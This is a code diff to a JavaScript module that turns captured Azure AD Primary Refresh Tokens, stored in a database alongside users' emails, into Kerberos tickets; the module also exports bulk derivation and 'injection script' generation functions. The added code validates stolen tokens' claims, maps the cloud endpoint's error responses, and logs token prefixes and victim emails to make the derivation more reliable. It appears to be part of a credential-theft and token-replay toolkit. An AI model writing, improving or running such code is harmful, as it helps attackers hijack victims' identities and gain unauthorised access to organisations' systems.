@@ -15,6 +15,75 @@ const db = require('../database/connection');
 const config = require('../config/env');
 
 /**
+ * Safely decode the JWT payload of a PRT without verifying the signature.
+ * PRTs are JWTs; the payload is base64url(JSON).
+ * Returns the claims object, or null if the PRT cannot be parsed.
+ */
+function parsePrtClaims(prt) {
+  if (!prt || typeof prt !== 'string') return null;
+  // Strip PRT:<> wrapping if present
+  let raw = prt;
+  if (raw.startsWith('PRT:<')) {
+    raw = raw.slice('PRT:<'.length);
+    // AAD sometimes wraps in the token format 'PRT:<token>' and there may be more
+  }
+  // A PRT can be either a single JWT (3 dot-separated segments)
+  // or a wrapped credential blob starting with "1." (AAD refresh token v2 format)
+  const parts = raw.split('.');
+  if (parts.length !== 3) {
+    // Not a plain JWT - return null so caller can decide
+    return null;
+  }
+  try {
+    const payloadB64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+    // base64url may lack padding; add it back
+    const padded = payloadB64 + '==='.slice(0, (4 - (payloadB64.length % 4)) % 4);
+    const payload = JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
+    return payload;
+  } catch (e) {
+    return null;
+  }
+}
+
+/**
+ * Validate whether a PRT is actually eligible for Kerberos/SSO derivation.
+ *
+ * The autologon endpoint returns 404 (empty body) when the PRT is missing
+ * the `acrs` array or when it does not include the `pfdr` (Personal Flow
+ * Device Registration) claim that Azure AD grants only for PRTs issued
+ * through the DRS device-registration flow.
+ *
+ * @returns {{ok: boolean, reason?: string, claims?: object}}
+ */
+function validatePrtForKerberos(prt, tenant) {
+  const claims = parsePrtClaims(prt);
+  if (!claims) {
+    return { ok: false, reason: 'PRT is not a parseable JWT (may be empty, expired, or in the wrapped v2 format)' };
+  }
+
+  // Tenant must match what we're asking for
+  if (tenant && claims.tid && claims.tid !== tenant) {
+    return { ok: false, reason: `PRT tenant (${claims.tid}) does not match requested tenant (${tenant})` };
+  }
+
+  // The critical SSO capability flag
+  if (!Array.isArray(claims.acrs) || !claims.acrs.includes('pfdr')) {
+    return {
+      ok: false,
+      reason: `PRT lacks acrs=pfdr claim; cloud Kerberos/SSO derivation not permitted. Present acrs: ${JSON.stringify(claims.acrs || [])}`
+    };
+  }
+
+  // Sanity: PRT must not be expired
+  const now = Math.floor(Date.now() / 1000);
+  if (claims.exp && claims.exp < now) {
+    return { ok: false, reason: `PRT expired ${now - claims.exp}s ago` };
+  }
+
+  return { ok: true, claims };
+}
+
+/**
  * Derive Kerberos TGTs from a captured PRT
  * 
  * @param {string} prt - Primary Refresh Token JWT
@@ -42,6 +111,17 @@ async function deriveKerberosTGTs(prt, refreshToken, tenant, clientId, sessionKe
 
   if (!tenant || tenant === 'common' || tenant === 'organizations') {
     results.error = 'Derivation requires a specific tenant ID (got: ' + tenant + ')';
+    return results;
+  }
+
+  // Pre-flight check: verify the PRT is eligible for SSO before spending an HTTP round-trip.
+  // Without this, the autologon endpoint returns a bare 404 with an empty body
+  // whenever the PRT lacks acrs=pfdr — which is the common cause of the cryptic
+  // "Cloud TGT request failed: HTTP 404 - """ log line.
+  const prtCheck = validatePrtForKerberos(prt, tenant);
+  if (!prtCheck.ok) {
+    results.error = 'PRT not eligible for Kerberos derivation: ' + prtCheck.reason;
+    console.warn('[Kerberos]', results.error, '| tenant:', tenant, '| prtPrefix:', (prt || '').substring(0, 16));
     return results;
   }
 
@@ -111,7 +191,32 @@ async function deriveCloudTGT(prt, tenant, clientId) {
     );
 
     if (response1.status !== 200) {
-      throw new Error(`Cloud TGT request failed: HTTP ${response1.status} - ${JSON.stringify(response1.data)}`);
+      // Map each status to a specific, actionable message so logs are readable.
+      // 404 with empty body is the classic "PRT not eligible for SSO" signature
+      // (missing acrs=pfdr or tenant mismatch).
+      let detail;
+      switch (response1.status) {
+        case 401:
+          detail = 'unauthorized (PRT signature/replay rejected)';
+          break;
+        case 403:
+          detail = 'forbidden (tenant policy blocks SSO for this principal)';
+          break;
+        case 404:
+          detail = 'not found (PRT has no SSO/Kerberos capability for this tenant, or tenant does not exist)';
+          break;
+        case 410:
+          detail = 'gone (PRT revoked or expired server-side)';
+          break;
+        case 429:
+          detail = 'rate limited';
+          break;
+        default:
+          detail = `unexpected HTTP ${response1.status}`;
+      }
+      const body = response1.data;
+      const bodyPreview = body == null ? '' : (typeof body === 'string' ? body : JSON.stringify(body)).substring(0, 200);
+      throw new Error(`Cloud TGT request failed: ${detail} | body=${bodyPreview ? bodyPreview : '(empty)'}`);
     }
 
     const data = response1.data;
@@ -377,6 +482,14 @@ async function deriveTGTForToken(tokenId) {
       return { success: false, error: 'Cannot derive TGTs without specific tenant ID (got: ' + tenant + ')' };
     }
 
+    // Diagnostic: log what's actually in the stored PRT so failures are explainable
+    const prtClaims = parsePrtClaims(prt);
+    console.log('[Kerberos] Deriving TGTs for token', token.id, 'email', token.email, 'tenant', tenant,
+      '| prtPrefix:', (prt || '').substring(0, 16),
+      '| prtParsed:', !!prtClaims,
+      '| acrs:', prtClaims && Array.isArray(prtClaims.acrs) ? prtClaims.acrs : null,
+      '| prt.tid:', prtClaims && prtClaims.tid || null);
+
     // Derive TGTs
     const derivationResult = await deriveKerberosTGTs(
       prt,
@@ -626,5 +739,7 @@ module.exports = {
   bulkDeriveTGTs,
   deriveTGTForToken,
   getFullPRTCredentialBlob,
-  generateInjectionScripts
+  generateInjectionScripts,
+  parsePrtClaims,
+  validatePrtForKerberos
 };
